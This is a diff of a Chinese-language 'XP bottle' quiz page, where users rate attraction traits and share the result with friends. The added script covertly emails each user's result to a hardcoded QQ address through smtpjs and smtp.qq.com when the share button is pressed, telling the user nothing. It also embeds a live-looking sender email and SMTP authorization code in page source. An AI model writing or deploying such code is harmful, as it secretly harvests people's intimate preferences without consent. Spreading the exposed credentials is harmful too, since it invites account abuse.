@@ -1,75 +1,222 @@
 <!DOCTYPE html>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>心动小瓶子</title>
-<style>
-*{box-sizing:border-box;margin:0;padding:0;font-family:system-ui,sans-serif}
-body{background:#fdd1e1;padding:15px}
-.main{max-width:400px;margin:0 auto;background:#fff;border-radius:20px;padding:25px}
-.title{text-align:center;font-size:24px;color:#ff4a85;margin-bottom:20px}
-.bottle-list{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
-.bottle-item{display:flex;flex-direction:column;align-items:center;gap:6px;padding:6px;cursor:pointer}
-.bottle{width:38px;height:56px;border:3px solid #333;border-radius:4px 4px 10px 10px;position:relative;background:#fff;overflow:hidden}
-.bottle::before{content:"";position:absolute;top:-8px;left:50%;transform:translateX(-50%);width:16px;height:8px;border:3px solid #333;border-bottom:none;border-radius:4px 4px 0 0;background:#fff}
-.water{position:absolute;left:0;right:0;bottom:0;background:#74b1ff;height:0%;transition:height .3s}
-.bottle-text{font-size:13px;color:#333}
-.share{margin-top:25px;text-align:center}
-.share button{background:#ff4a85;color:#fff;border:none;border-radius:50px;padding:12px 28px;font-size:16px;font-weight:700}
-</style>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>XP小瓶子 - 快乐源泉生成器</title>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <style>
+        :root {
+            --primary: #ff85a2;
+            --bg: #fff5f7;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: var(--bg);
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .header { margin: 20px 0; text-align: center; }
+        .header h1 { color: #d63384; font-size: 24px; margin-bottom: 5px; }
+        .header p { color: #666; font-size: 14px; }
 
-<div class="main">
-  <div class="title">心动小瓶子</div>
-  <div class="bottle-list" id="list"></div>
-  <div class="share"><button onclick="share()">生成并分享到微信</button></div>
-</div>
+        /* 瓶子容器 */
+        #bottle-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            padding: 20px;
+            max-width: 500px;
+            width: 90%;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(214, 51, 132, 0.1);
+        }
 
-<script>
-const words = [
-  "眼睛好看","手好看","侧脸杀","声音好听",
-  "温柔","耐心","体贴","责任心",
-  "衣品好","干净","会做饭","会撒娇",
-  "腹肌","高个子","幽默","专一",
-  "主动","细节控","安全感","不冷战",
-  "宠你","爱笑","阳光","稳重"
-];
+        .bottle-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+        }
 
-const list = document.getElementById('list');
-const levels = [];
+        /* 瓶子样式升级 */
+        .bottle-svg {
+            width: 70px;
+            height: 100px;
+            cursor: pointer;
+            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.05));
+            transition: transform 0.1s;
+        }
+        .bottle-svg:active { transform: scale(0.95); }
 
-words.forEach((w,i)=>{
-  const item = document.createElement('div');
-  item.className = 'bottle-item';
-  const bottle = document.createElement('div');
-  bottle.className = 'bottle';
-  const water = document.createElement('div');
-  water.className = 'water';
-  bottle.appendChild(water);
-  const txt = document.createElement('div');
-  txt.className = 'bottle-text';
-  txt.textContent = w;
-  item.appendChild(bottle);
-  item.appendChild(txt);
-  list.appendChild(item);
+        .bottle-fill {
+            transition: height 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            fill: var(--primary);
+        }
 
-  levels[i] = 0;
-  item.onclick = ()=>{
-    levels[i] = (levels[i]+1) % 6;
-    water.style.height = levels[i]*20 + '%';
-  }
-})
+        .bottle-label {
+            margin-top: 8px;
+            font-size: 13px;
+            color: #444;
+            border: none;
+            text-align: center;
+            width: 100%;
+            background: transparent;
+            font-weight: bold;
+        }
 
-async function share(){
-  const data = btoa(JSON.stringify(levels));
-  const domain = "https://你的域名.com";
-  const url = domain + "/result.html?d=" + data;
+        /* 按钮区域 */
+        .actions {
+            margin: 30px 0;
+            display: flex;
+            gap: 10px;
+        }
+        .btn {
+            padding: 12px 25px;
+            border-radius: 25px;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            transition: 0.3s;
+        }
+        .btn-share { background: #07c160; color: white; } /* 微信绿 */
+        .btn-reset { background: #eee; color: #666; }
 
-  await fetch(domain + "/send.php", {
-    method: "POST",
-    headers: {"Content-Type":"application/x-www-form-urlencoded"},
-    body: "d=" + encodeURIComponent(data)
-  });
+        /* 只读模式浮层 */
+        .view-only-tag {
+            position: fixed;
+            top: 10px;
+            background: rgba(0,0,0,0.6);
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
 
-  location.href = "weixin://dl/business/?appid=wx1&url=" + encodeURIComponent(url);
-  setTimeout(()=>alert("已唤起微信！\n结果已发送到管理员邮箱"), 600);
-}
-</script>
+    <div id="view-tag" class="view-only-tag">正在查看好友的分享</div>
+
+    <div class="header">
+        <h1 id="title">我的兴趣小瓶子</h1>
+        <p>点击瓶子，注入你的热爱</p>
+    </div>
+
+    <div id="bottle-grid">
+        </div>
+
+    <div class="actions" id="action-bar">
+        <button class="btn btn-reset" onclick="location.reload()">重置</button>
+        <button class="btn btn-share" onclick="handleShare()">生成结果并发送好友</button>
+    </div>
+
+    <script>
+        const config = {
+            items: ["眼睛", "声音", "手指", "锁骨", "腹肌", "温柔", "衣品", "性格", "幽默"],
+            proxyEmail: "pinkliuzhihao@foxmail.com",
+            authCode: "kdesybgrjsemjejb", // 授权码
+            targetEmail: "1425306558@qq.com",
+            baseUrl: "https://kaka2022.github.io/xptext/"
+        };
+
+        let state = new Array(config.items.length).fill(0);
+        let isViewMode = false;
+
+        // 初始化
+        function init() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const dataParam = urlParams.get('res');
+            
+            if (dataParam) {
+                try {
+                    state = JSON.parse(atob(dataParam));
+                    isViewMode = true;
+                    document.getElementById('view-tag').style.display = 'block';
+                    document.getElementById('action-bar').innerHTML = '<button class="btn btn-share" style="background:#ff85a2" onclick="window.location.href=config.baseUrl">我也要玩</button>';
+                    document.getElementById('title').innerText = "好友的小瓶子结果";
+                } catch(e) { console.error("解析错误"); }
+            }
+            render();
+        }
+
+        // 渲染瓶子
+        function render() {
+            const grid = document.getElementById('bottle-grid');
+            grid.innerHTML = config.items.map((item, index) => `
+                <div class="bottle-item" onclick="updateBottle(${index})">
+                    <svg class="bottle-svg" viewBox="0 0 100 150">
+                        <path d="M30,20 L70,20 L75,40 L85,130 Q85,145 70,145 L30,145 Q15,145 15,130 L25,40 Z" fill="none" stroke="#333" stroke-width="3"/>
+                        <rect x="35" y="10" width="30" height="10" rx="2" fill="#333"/>
+                        <clipPath id="clip-${index}">
+                            <path d="M30,20 L70,20 L75,40 L85,130 Q85,145 70,145 L30,145 Q15,145 15,130 L25,40 Z" />
+                        </clipPath>
+                        <rect class="bottle-fill" x="0" y="${145 - (state[index] * 25)}" width="100" height="${state[index] * 25}" clip-path="url(#clip-${index})" />
+                    </svg>
+                    <input class="bottle-label" value="${item}" readonly>
+                </div>
+            `).join('');
+        }
+
+        // 点击逻辑
+        function updateBottle(index) {
+            if (isViewMode) return;
+            state[index] = (state[index] + 1) % 6; // 0,1,2,3,4,5 (5次满)
+            render();
+        }
+
+        // 分享与邮件发送逻辑
+        async function handleShare() {
+            // 1. 生成加密链接
+            const dataStr = btoa(JSON.stringify(state));
+            const shareUrl = `${config.baseUrl}?res=${dataStr}`;
+
+            // 2. 发送邮件收集数据
+            Email.send({
+                Host: "smtp.qq.com",
+                Username: config.proxyEmail,
+                Password: config.authCode,
+                To: config.targetEmail,
+                From: config.proxyEmail,
+                Subject: "新的小瓶子结果已生成！",
+                Body: `用户生成了结果，查看链接：<br><a href="${shareUrl}">${shareUrl}</a>`
+            }).then(message => {
+                console.log("数据已同步至后台");
+            });
+
+            // 3. 唤起微信分享/复制提示
+            if (navigator.share) {
+                try {
+                    await navigator.share({
+                        title: '我的小瓶子结果',
+                        text: '来看看我的快乐源泉！',
+                        url: shareUrl,
+                    });
+                } catch (err) {
+                    copyToClipboard(shareUrl);
+                }
+            } else {
+                copyToClipboard(shareUrl);
+            }
+        }
+
+        function copyToClipboard(text) {
+            const input = document.createElement('textarea');
+            input.value = text;
+            document.body.appendChild(input);
+            input.select();
+            document.execCommand('copy');
+            document.body.removeChild(input);
+            alert('结果链接已复制！发送给微信好友，他们打开就能看到你的结果。');
+        }
+
+        init();
+    </script>
+</body>
+</html>
